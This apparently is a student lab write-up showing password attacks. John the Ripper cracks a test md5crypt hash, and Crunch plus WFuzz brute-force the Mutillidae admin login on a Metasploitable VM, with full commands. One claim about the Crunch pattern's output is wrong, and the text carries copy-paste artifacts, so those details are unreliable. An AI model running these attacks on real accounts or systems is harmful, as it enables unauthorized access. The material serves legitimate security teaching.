# 🔐 Project 3: Brute Force & Dictionary Attacks

---

## 📘 About the Project

This project explores the execution and impact of **brute force** and **dictionary attacks**, two common password-cracking techniques used in cybersecurity. Used real penetration testing tools to simulate these attacks and highlight the risks of weak passwords and poor system configuration.

---

## 🎥 Video Demonstration

**YouTube**: [Brute Force & Dictionary Attack](https://youtu.be/GBG-5aOF89g)

---

Focus was on:
- Using **John the Ripper** to crack hashed passwords
- Employing **Crunch** to generate password lists
- Using **WFuzz** to brute-force a login form on a vulnerable web application

---

## 🧪 Tools Used

| Tool            | Purpose |
|------------------|---------|
| **John the Ripper** | Cracking password hashes using brute force and dictionary attacks |
| **Crunch** | Generating custom password lists with user-defined patterns |
| **WFuzz** | Fuzzing login forms with password lists to find valid credentials |

---

## 🔍 Part 1: Cracking Passwords with John the Ripper

### 🛠️ Environment Setup
```bash
sudo apt update
sudo apt install john
```
### 🔑 Steps
Generate a hashed password

``` bash
Copy
Edit
openssl passwd -1 password1234
```
Create a simulated /etc/shadow file
shadow1a.txt contains the MD5-hashed password

Create a simulated /etc/passwd file
passwd1a.txt contains user info

Merge files with unshadow

```bash
Copy
Edit
unshadow passwd1a.txt shadow1a.txt > hashes1a.txt
Create a dictionary wordlist

```

``` bash
Copy
Edit
echo -e "123456\npassword\nroot\nadmin\npassword123\npassword1234" > testlist1a.txt
Run John the Ripper

```

``` bash
Copy
Edit
john --format=md5crypt --wordlist=testlist1a.txt hashes1a.txt
Display cracked password(s)

```

``` bash
Copy
Edit
john --show hashes1a.txt

```

✅ John successfully cracked the hash for password1234.

### 🔍 Part 2: Brute Force with WFuzz & Crunch
🛠️ Environment Setup
``` bash
Copy
Edit
sudo apt update
sudo apt install wfuzz
sudo apt install crunch

``` 
### 🌐 Target
Vulnerable web app: Mutillidae on Metasploitable VM

Login form URL:
http://192.168.121.131/mutillidae/index.php?page=login.php

### 🔐 Step-by-Step
### 1. Generate a password list with Crunch
``` bash
Copy
Edit
crunch 9 9 -t admin@@@@ > password.lst
Generates combinations like admin0000 to admin9999

```

We inserted the real password adminpass near the top for demo purposes

### 2. Run WFuzz attack
```bash
Copy
Edit
wfuzz -z file,/root/password.lst -d "username=admin&password=FUZZ&login-php-submit-button=Login" http://192.168.121.131/mutillidae/index.php?page=login.php
WFuzz iterates through all passwords in password.lst
```
Correct password adminpass was successfully identified

### 3. Verify Login
Visited the login URL in a browser

``` 
Used:

Username: admin

Password: adminpass

```

### ✅ Login was successful

### 🔚 Conclusion
Brute Force attacks try all possible combinations; Dictionary attacks are faster using pre-built lists.

Tools like Crunch, John the Ripper, and WFuzz are powerful for demonstrating password security flaws.

This project emphasizes the importance of:

Strong password policies

Rate limiting and account lockout features

Using hashed and salted passwords with modern algorithms (e.g., bcrypt)
